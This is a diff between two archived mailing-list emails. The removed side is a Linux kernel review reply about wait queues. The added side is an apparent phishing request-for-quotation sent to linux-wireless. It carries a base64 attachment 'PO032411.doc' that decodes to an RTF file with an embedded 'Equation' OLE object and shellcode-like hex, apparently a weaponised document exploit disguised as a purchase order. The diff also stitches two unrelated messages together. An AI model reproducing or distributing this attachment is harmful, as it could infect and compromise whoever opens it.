@@ -2,80 +2,134 @@ Return-Path: <linux-wireless-owner@vger.kernel.org>
 X-Original-To: lists+linux-wireless@lfdr.de
 Delivered-To: lists+linux-wireless@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by mail.lfdr.de (Postfix) with ESMTP id 2C0CD18C7C4
-	for <lists+linux-wireless@lfdr.de>; Fri, 20 Mar 2020 08:00:03 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTP id 7565C18C80C
+	for <lists+linux-wireless@lfdr.de>; Fri, 20 Mar 2020 08:14:05 +0100 (CET)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1726809AbgCTG75 (ORCPT <rfc822;lists+linux-wireless@lfdr.de>);
-        Fri, 20 Mar 2020 02:59:57 -0400
-Received: from bombadil.infradead.org ([198.137.202.133]:43512 "EHLO
-        bombadil.infradead.org" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1726232AbgCTG75 (ORCPT
+        id S1726906AbgCTHOE (ORCPT <rfc822;lists+linux-wireless@lfdr.de>);
+        Fri, 20 Mar 2020 03:14:04 -0400
+Received: from [37.49.224.149] ([37.49.224.149]:63094 "EHLO
+        walker-construction.co.uk" rhost-flags-FAIL-FAIL-OK-FAIL)
+        by vger.kernel.org with ESMTP id S1726897AbgCTHOE (ORCPT
         <rfc822;linux-wireless@vger.kernel.org>);
-        Fri, 20 Mar 2020 02:59:57 -0400
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
-        d=infradead.org; s=bombadil.20170209; h=In-Reply-To:Content-Type:MIME-Version
-        :References:Message-ID:Subject:Cc:To:From:Date:Sender:Reply-To:
-        Content-Transfer-Encoding:Content-ID:Content-Description;
-        bh=iZ+tfXP9s+9EAQeQf95cP5ovh7AcQ3rFatDjmNA0Hpo=; b=SS2stUyn7rcx2bDE5sgbJPy234
-        X9zm/vp1W32VRiUAiag9wc6+PVqSgvIgsex3vU9E84yi9emMqCBjOL8b7qfPZtQkzzDv+ofwjR/c0
-        QqIG4wFoyXYG03dKfZLr/ByjjOnzQZgMIsED/UXA3TjGOpdi16UiLfl7+s/pKrebSwQXNd9u4pstl
-        +qXtTUiOQHDVZkhWsyHsqIFLLUunbIQgVzbJEP1S4/2sDgk9ikKUV9u7HOeGT3pSs1gwB2yhFrrPK
-        c3xR/dV7sjrTgGqDl4NyeXhuFf9XPfBkHa1DsefnsUIiMYD5W+PnILH3G4rhCIrK0mmmME0frAQvb
-        yfAFAVTA==;
-Received: from hch by bombadil.infradead.org with local (Exim 4.92.3 #3 (Red Hat Linux))
-        id 1jFBdD-00080q-N8; Fri, 20 Mar 2020 06:59:47 +0000
-Date:   Thu, 19 Mar 2020 23:59:47 -0700
-From:   Christoph Hellwig <hch@infradead.org>
-To:     Julian Calaby <julian.calaby@gmail.com>
-Cc:     Thomas Gleixner <tglx@linutronix.de>,
-        Randy Dunlap <rdunlap@infradead.org>,
-        Peter Zijlstra <peterz@infradead.org>,
-        linux-pci@vger.kernel.org,
-        Sebastian Andrzej Siewior <bigeasy@linutronix.de>,
-        Oleg Nesterov <oleg@redhat.com>,
-        Joel Fernandes <joel@joelfernandes.org>,
-        Will Deacon <will@kernel.org>, Ingo Molnar <mingo@kernel.org>,
-        Davidlohr Bueso <dave@stgolabs.net>,
-        "Paul E . McKenney" <paulmck@kernel.org>,
-        Logan Gunthorpe <logang@deltatee.com>,
-        Arnd Bergmann <arnd@arndb.de>, linuxppc-dev@lists.ozlabs.org,
-        Steven Rostedt <rostedt@goodmis.org>,
-        Bjorn Helgaas <bhelgaas@google.com>,
-        Kurt Schwemmer <kurt.schwemmer@microsemi.com>,
-        Kalle Valo <kvalo@codeaurora.org>,
-        Felipe Balbi <balbi@kernel.org>,
-        Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-        linux-usb <linux-usb@vger.kernel.org>,
-        linux-wireless@vger.kernel.org,
-        LKML <linux-kernel@vger.kernel.org>, netdev@vger.kernel.org,
-        Linus Torvalds <torvalds@linux-foundation.org>,
-        "David S. Miller" <davem@davemloft.net>
-Subject: Re: [patch V2 11/15] completion: Use simple wait queues
-Message-ID: <20200320065947.GA25206@infradead.org>
-References: <20200318204302.693307984@linutronix.de>
- <20200318204408.521507446@linutronix.de>
- <CAGRGNgXAW14=8ntTiB_hJ_nLq7WC_oFR3N9BNjqVEZM=ze85tQ@mail.gmail.com>
+        Fri, 20 Mar 2020 03:14:04 -0400
+From:   "Wilson Jasper" <wilson@walker-construction.co.uk>
+To:     linux-wireless@vger.kernel.org
+Subject: RE: Walker Construction_RFQ
+Date:   20 Mar 2020 08:14:00 +0100
+Message-ID: <20200320081400.98B6D021F6A0C484@walker-construction.co.uk>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <CAGRGNgXAW14=8ntTiB_hJ_nLq7WC_oFR3N9BNjqVEZM=ze85tQ@mail.gmail.com>
-X-SRS-Rewrite: SMTP reverse-path rewritten from <hch@infradead.org> by bombadil.infradead.org. See http://www.infradead.org/rpr.html
+Content-Type: multipart/mixed;
+        boundary="----=_NextPart_000_0012_A6412091.C76B30B6"
 Sender: linux-wireless-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <linux-wireless.vger.kernel.org>
 X-Mailing-List: linux-wireless@vger.kernel.org
 
-On Fri, Mar 20, 2020 at 10:25:41AM +1100, Julian Calaby wrote:
-> > +++ b/drivers/usb/gadget/function/f_fs.c
-> > @@ -1703,7 +1703,7 @@ static void ffs_data_put(struct ffs_data
-> >                 pr_info("%s(): freeing\n", __func__);
-> >                 ffs_data_clear(ffs);
-> >                 BUG_ON(waitqueue_active(&ffs->ev.waitq) ||
-> > -                      waitqueue_active(&ffs->ep0req_completion.wait) ||
-> > +                      swait_active(&ffs->ep0req_completion.wait) ||
-> 
-> This looks like some code is reaching deep into the dirty dark corners
-> of the completion implementation, should there be some wrapper around
-> this to hide that?
+This is a multi-part message in MIME format.
 
-Or just remote it entirely..
+------=_NextPart_000_0012_A6412091.C76B30B6
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Dear Sir/Madam,,
+
+Please confirm and give quotation as per attached,quote according=20
+to Bill of
+materials
+
+Highlighted items will be supplied in large quantity.
+
+Kind Regards.
+
+Wilson Jasper=20
+Purchase Manager
+Walker Construction (UK) Ltd.
+
+
+I will like a receipt of your acknowledgment mail.
+------=_NextPart_000_0012_A6412091.C76B30B6
+Content-Type: application/msword; name="PO032411.doc"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="PO032411.doc"
+
+e1xydGY2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtcb2JqZWN0e1w5
+MDYzOTIzOTB9XG9iamxpbmt7XDkwNjM5MjM5MH1cb2Jqdzg3OTJ7XDkwNjM5MjM5MH1cb2Jq
+aDI4MHtcOTA2MzkyMzkwfXtcOTA2MzkyMzkwfXtcb2JqZGF0YQ1ccHN6NTIyODIzNTQ2XHly
+MDU5NzcyMzIwMlwnPwkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJ
+CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJ
+CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJ
+CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQl7XG9iamVjdFxkbGJncHljbXdt
+cm9qWldCRUlYQkNaQ0hDRUlPVFdETDQwNzUxMjU2NzgxNDc1MzQwNDg4NDVkbGJncHljbXdt
+cm9qWldCRUlYQkNaQ0hDRUlPVFdETDUwODAxMDAzOTgxe1xhaXJqcXZqeHBtaHVkdHlwd2d1
+bnlza3JTSFFBUVFOU1BWWlFHWko5NzcwMTc5MTU1MjgzNDAwNzg0NjA4NDk2NGFpcmpxdmp4
+cG1odWR0eXB3Z3VueXNrclNIUUFRUU5TUFZaUUdaSjQwNDk2Njc5MDE0ODM2NjkwMTAzODUy
+NDUxOX19Zjk3MmIzNGIwMjAwMDAwMDBiMDAwMDAwNjU1MTc1NjE3NDY5NmY0e1xtYmVnQ2hy
+IFx7XHtcbWVuZENocn0NZTJlMzMwMDAwMDAwMDAwMDAwMDAwMDBiOTA2MDAwMDAyNjBmMWIy
+ZDVhMTAxMDhhYjFkYjg3ZWZmYzc1ZDI1M2RiZDZkODI4YjE4OGIxYmI4OWJhNGE2YzMwNTE1
+YzM5ZjNjOGIzMDUzZmZkNjA1YWM3MWQ4MTkyZDBhNzFkODE5ZmZlMGQzYjdmY2VhZWI0NDAw
+NDQ2NjIzNTZiMWI1ZTFhNjJjYTc0MDdjMDc2ZjViNGM2ZjAzNDM4NmE2NDgwYjgzNDRjMTFi
+NTljYzk4YmEyYTUwZGY2NzNlMWYyMGJkNDkzNzI2ODliYzU3YjZmMDMxMDM2NjBjN2I1Mzg0
+OTBiMmQxMmFkNTM2NjljY2NkZDBkZTE2YjczZjIwNDNjMDBkNGNjMDNjOWIxY2VmMmJjYzQ5
+MjBjZmEwZWIzM2Y5M2I4NzEyM2JhNjJiYzRiNzRiZmE2ODY1NTg2NWQwYWJjM2U5NDQwMTAw
+MDAzOWVhYzhlYmM3MGFmOWNhMmFjODk2YTk5NjI4MjViMGFlMGFiYThlY2Y3ODQyYjc0MmRl
+YmE5ZThhNGM3YTAwOWNiNzY1MTkyMDM3MzdlZWI3NDhjMTgyMmYwYjI0MjNjZTg0MTk5ZDhl
+ZDkyYTgyNWM5OWY2Njc1OWY0NzQyYTE5ZmUyNTI4ZThlZjY5ODAwMTYxYWU1ZGQ1OThiNzI2
+NGJiNmRjY2NmYzA1NDhmZTc0MmYzNzczNzY4NjQxMjczNTNlOGM5NjljYWQxMjA1ODc5M2Uz
+YjgwODRlNjIzYmE2MjM4NjlhOTY3OTFhYWIwOTFkZmYzZjYwODA2Njc0NmRmNzE3ZThiY2Y3
+YWZmY2NiNWZkYjE1NDlhZGEwZTE1ZDQ4OTM4Y2RlYjcyMTA5OWJlNGNhNGM5NTY0NWU5MzQz
+YTc0ODk5Y2I0OGMwZTE0YzQyMThmNDE2MzZmMjk4ZjFhNTg1MWQ1MzNkZGQ5OGFiMDYxOTFi
+OWFiMWFkMDEzNGQyOWUyYzQ2MjNjODNhOGFiZTFjZDFmMDY1ZGFkZmUxYmRkZWQxNzQ4Y2Nm
+ZDdiN2ZlNmYyYWVhZTZjZTQxYzVmNTk4MWZhZDA2NDQ4MjAzNTQ2NDMyNTdiZmQ5MzhhZTBk
+MWIyNWMzMjQ3NTQ4M2Y1MTQ4ZjkwOTg0NDdkNDcwOTJiN2YzODI3M2I0M2IzYjgzNzA5MmNi
+YzM2YTIzZDkxN2JjOTliZDg1NTI2YmM1N2MyODBiNzIwYjkzMzViOTI4N2MyOTQ0ZTk5Y2U1
+YWZjYmMxNzRjZWVlMTIxZGUxNTg0M2FmZTczMGUxYmRjOTAxOGNkZGFiZmMzNmU5MjEzNzY0
+M2ZlYjAzYTk3MTQzZThmNDAwMDAwMGU5ZDcwMDAwMDBlOWI4MDEwMDAwOWM1NjUyNTc5MDlj
+NTI4MWMyNjMwODAwMDA4MWVhNTgxNjAwMDA4MWMyNmIwNzAwMDA4MWMyOGM1YjAwMDA1YTlk
+OTA4MWVlNzQzMzAwMDA4MWVlOTQxNzAwMDA4MWVlZmMyNTAwMDA4MWVlMzU3MjAwMDA4MWM3
+MWM2MTAwMDA4MWMyY2UxZDAwMDA1ZjVhNWU5ZGU5ZGMwMDAwMDA4MWMxZDkwMTAwMDBlYjc5
+OWM1MDJkYjQ3NjAwMDAwNThiNWYwMDAwOGQ4MDQzNGYwMDAwMmQ0NzEyMDAwMDhkODBjMjUy
+MDAwMDA1ZDExYjAwMDA1ODlkZWIwNzY3NTlmYjdlMjk5M2U2ZTkwOTAxMDAwMGViNDk1NjVl
+OWM1MzUwOGQ5ODI2MzYwMDAwZWIwODU3NWZmZDM0NWE0OTViZDk1MjVhOGQ4M2NkNzkwMDAw
+NTc1ZmViMDdmMDUxY2RkMGI3MDQxYjgxZWI4MDU4MDAwMDgxZWJlMTU4MDAwMDhkODM0NzEx
+MDAwMDU4NWI5ZDU2NWVlOWQ2MDAwMDAwOTBlYmIyZWIzNzhkOTllYjAyMDAwMDZiYzAwMDkw
+NjljMDQ3MDdjMTQ1ZWI0NWViMWVlYjc3NTllOTVmZmZmZmZmZWIzOWViMTBmZmExY2MxZDdk
+ZWIwOTRkYzRlNDdkYzM1N2QxYTk0NmViNWJlOWJjMDAwMDAwZWJkZDljNTM4MWViOTY1NjAw
+MDA4M2ViNzI4MWViOTk2MTAwMDA4ZDliZTk2ZjAwMDA1YjlkZTkxZmZmZmZmZmViNmEwNTg1
+NTE5Nzc1ZWJiNDljNTM1NzUwODFjNzM0NWIwMDAwOGQ5ZmUyMTMwMDAwMDU4ZTQ5MDAwMDhk
+YmIyZDU0MDAwMDhkYjg3ZTBjMDAwMDU4NWY1YjlkZWIwNjMyNDYyZWYwYWQ1MzMxMDFlYjU4
+NTA1ODljNTI1MDU4OTA1MWViMDhlNTdlODc0MDJhZDY1NDBlODFjMTk5MjIwMDAwODFlOTJh
+MTQwMDAwOGQ5MTc0NzEwMDAwODFjMTJiNzYwMDAwNTk1YTlkZTkzZGZmZmZmZmViOTQ1NjVl
+ZTk1YmZlZmZmZmU5ZGZmZWZmZmZlOTQ2ZmZmZmZmZWIwNzcwZTBjYzlmMGFiZDg2ZTk3M2Zm
+ZmZmZmU5Y2NmZWZmZmY4M2MxMDRlYjA1ZTkwZGZmZmZmZjM5ZDkwZjgyMGZmZmZmZmYwNGJk
+MTc3NzY4OTBlNjk2NWQzNmZjMGE1MDk1MjNlN2I1NDk3MWVmYjgyYjg0OTg4ZDBmZjU0ZWEw
+ZDY3Mjc5ZTUwZjY5YTNlMGYwY2YyOGJkZmE1NjAzOTQ2NjdjOWY2N2FiZTAzMDBmZjBmYjBi
+YTk2MzVjMjJjOTMyNzgzNzQ1MTZjMDA2Y2QxNTJlMjc3MjljYjZlM2Y0YWY1MDZhMDZiNDc1
+MmVkMDkyNzcwZWM0ODg0N2ZhZTAyMzY3MWZkZDE0NmNhODJjZmIxZDZjMTQ3ZDQyYmM1ZDZk
+YWUyZDg2OTIzMGRmZjY0ZTc5MTFhZDUxZGJhYmU4Y2UxMmNjMDU3NjQ5ZTBlMDQwNjIwYmRk
+ZTc0ZWU1ZDBlYjZkMDIzNTMxN2Q2YzM4ZmJmYWZiMGQzZTcwYmUyMGI1MTA5ZTY1YWVjN2Zj
+ODgzODFiOTAzZGUyNTNjNzcwYWU3ODMzOTU1NmVjODhkODI4NjM3ZjZkYWJjYTg1YzAxNzU4
+NWZjNTk5NjBmNTI4ZDcwMTIzOWRkZWIwMmQxMDIwOWI0OWY1MmQyNTM3YTgyYmQzYWFjZGNm
+YmQ5ZTEyOGUwOGQwNjg2ZWQwMzdhNmUwOTYyYTAyZjdiNWQ3YjA2MjBmZDIwN2NjN2E0MjZm
+NTJlODBmNGNjMDU0ZjE0NjdjNDM1NmQyMjQ2OTM5YmU3ZmI1MGE1ZDk0OWE0MjVjYjc2NmIx
+YjUxYWNlMzFiOGMzZjBiMzhkMmZjODY2YTA2MTMyYjFlNTQ2YTQxODA4NmNiNmIxYmRiNmY5
+YmNmMGYxNTNlOTE1OTNlOTViNTg2MjNkY2VlZDg5NzVkMDQwZTU2N2M0NDUxZDU2NjJhODA4
+NzRhNTFkNGQ1NjAxOTAzZjE4ZWE3NTQwMjhhN2Y4MDYwMzlmNGRhN2JlNGZlMDFkNDk4ZmE1
+ODQyNWZhNDhjOTQ5OWI3ZGY0ZDlmODMwNzcxNmNhZDVhYTllNDg5OGI3NWRlZWFkZjFkOTNi
+ODBhZWQxZjAwNWE4NjhhZmU4ZjIwZjlhZGRhZmY5YTJkMGY1MDcwMGU1YmNmM2YxMzgxZmEx
+ZTI3OWQxMDg3MzUyY2EwZmZhMmM4MjkyNDFkZmE0NzM2MGViMjYzODBhNTQ3ODI2YWFjN2E5
+ZGNkYWQ3NjdiNjFjMmU3NGI4OGJiNDcxNmVhZmFhMzE0NTlhNWJmZTU2MmM2Mjg1ZTVlMDM0
+YTUyZWYzZjVmMjIyOWQ1YzgwNmE1NGNkMDBkYjE1MGFlM2ZmMDA0ZjAxYWIwM2EyYTU2MTlk
+NzA5NzA2MTFlMjY4ODRkYzU5MzNlMzE0NWQ5OTdmNjc3ZDE1NDBlZjY1NTkwZjhjZDYwOGZh
+MTE2ODY1YzkxYzM5Nzc0NDcyNTBkYTU3ZTBlNzAxYmUwYWI0OWE0OTQzYzc3MzVjODdkNGNj
+NjZlNGVlMzUzYTU0OGQ0N2FlMmUzNmJlZjNlZjMyOTA3MDhiOWU3Y2Y3ZDhkMzZlNmIwM2Uy
+NTE4MWY1YzVkZjI4YTYyMzg3M2M4ODgxMGRhYjUzN2NiNzYwMWMxMzNmMjJkNTc5ZmNiODhj
+YjkyODllMjhjZWFjMWFmZWVkYWI0YTY3ODVlYzJiYWIzYzRhYjZjZTk2NTE4OTU2ZGI3Y2M5
+YjBkN2NmNGVmMjk3YzUyZWIzNmYwYjQ5NTVkYTM2YTUxYjU2ZjM1M2VlNjM0ODc3YmY1NmVm
+NmExZjk0OTY4Nzg1MzU0NjhiOGNiM2NjZDc4MjU1YTVmYjczMTA1MzA3MGQxMWMyYTI5OTgz
+NjQ2ZjM2YjQwMTYwNWUwNDBiOTYzYTVjYzA0YzI4MmY1ZGQ4MWZjYjNjZmM3Mzk4ODIwOTI3
+MzI3Y2JhZGUwY2FmYmExNDJhYWE5YThjNTA1ZTkxNWU2ZDk4NDg0Nzc5NWQxYWQ4NGUxNmVm
+NDcyOWQzZGFkZGU1MTc1MDJlOTczNGU0YTYzZjZlMWEyNGUzYTg2MTAwMDAwMDAwfVxvYmp1
+cGRhdGU2MzkzNTkxMTF9fQ==
+
+------=_NextPart_000_0012_A6412091.C76B30B6--
